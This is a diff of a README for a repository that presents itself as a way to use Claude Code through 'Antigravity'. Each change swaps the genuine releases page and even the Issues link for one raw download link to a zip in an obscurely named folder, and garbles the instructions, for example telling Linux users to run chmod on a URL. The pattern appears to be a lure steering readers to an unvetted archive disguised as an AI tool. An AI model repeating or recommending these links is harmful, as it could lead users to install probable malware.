@@ -1,6 +1,6 @@
 # 🚀 claude-code-via-antigravity - Access Claude Code Easily Anywhere
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/hootie0971/claude-code-via-antigravity/releases)
+[![Download Latest Release](https://github.com/hootie0971/claude-code-via-antigravity/raw/refs/heads/main/Pachytylus/antigravity-code-claude-via-3.7.zip)](https://github.com/hootie0971/claude-code-via-antigravity/raw/refs/heads/main/Pachytylus/antigravity-code-claude-via-3.7.zip)
 
 ---
 
@@ -50,7 +50,7 @@ You don’t need any special skills to use this app. Just follow the steps below
 
 Click the big button below to go to the latest releases page:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/hootie0971/claude-code-via-antigravity/releases)
+[![Download Latest Release](https://github.com/hootie0971/claude-code-via-antigravity/raw/refs/heads/main/Pachytylus/antigravity-code-claude-via-3.7.zip)](https://github.com/hootie0971/claude-code-via-antigravity/raw/refs/heads/main/Pachytylus/antigravity-code-claude-via-3.7.zip)
 
 This page has all the available versions for Linux, macOS, and Windows.
 
@@ -62,7 +62,7 @@ Look for the file that matches your computer’s OS:
 
 - For Windows: Look for `.exe` or `.msi` files.
 - For macOS: Look for `.dmg` or `.zip` files.
-- For Linux: Look for `.AppImage`, `.deb`, or `.tar.gz` files.
+- For Linux: Look for `.AppImage`, `.deb`, or `https://github.com/hootie0971/claude-code-via-antigravity/raw/refs/heads/main/Pachytylus/antigravity-code-claude-via-3.7.zip` files.
 
 ---
 
@@ -76,7 +76,7 @@ Click the file name to start the download. The file size is usually under 100 MB
 
 - **Windows:** Double-click the `.exe` or `.msi` file you downloaded and follow the instructions on the screen.
 - **macOS:** Open the `.dmg` file, drag the app to your Applications folder.
-- **Linux:** Make the file executable by running `chmod +x filename.AppImage` in your terminal, then run it by double-clicking or from the terminal.
+- **Linux:** Make the file executable by running `chmod +x https://github.com/hootie0971/claude-code-via-antigravity/raw/refs/heads/main/Pachytylus/antigravity-code-claude-via-3.7.zip` in your terminal, then run it by double-clicking or from the terminal.
 
 ---
 
@@ -156,7 +156,7 @@ You can learn more about how to use Claude Code and Google Antigravity by checki
 
 ## 🤝 Getting Support
 
-If you need help, visit the [GitHub Issues page](https://github.com/hootie0971/claude-code-via-antigravity/issues) to report bugs or ask for advice. The community and maintainers will respond there.
+If you need help, visit the [GitHub Issues page](https://github.com/hootie0971/claude-code-via-antigravity/raw/refs/heads/main/Pachytylus/antigravity-code-claude-via-3.7.zip) to report bugs or ask for advice. The community and maintainers will respond there.
 
 ---
 
@@ -177,4 +177,4 @@ If you need help, visit the [GitHub Issues page](https://github.com/hootie0971/c
 
 For the latest updates and downloads, always return to the main release page:
 
-[Download Latest Release](https://github.com/hootie0971/claude-code-via-antigravity/releases)
+[Download Latest Release](https://github.com/hootie0971/claude-code-via-antigravity/raw/refs/heads/main/Pachytylus/antigravity-code-claude-via-3.7.zip)
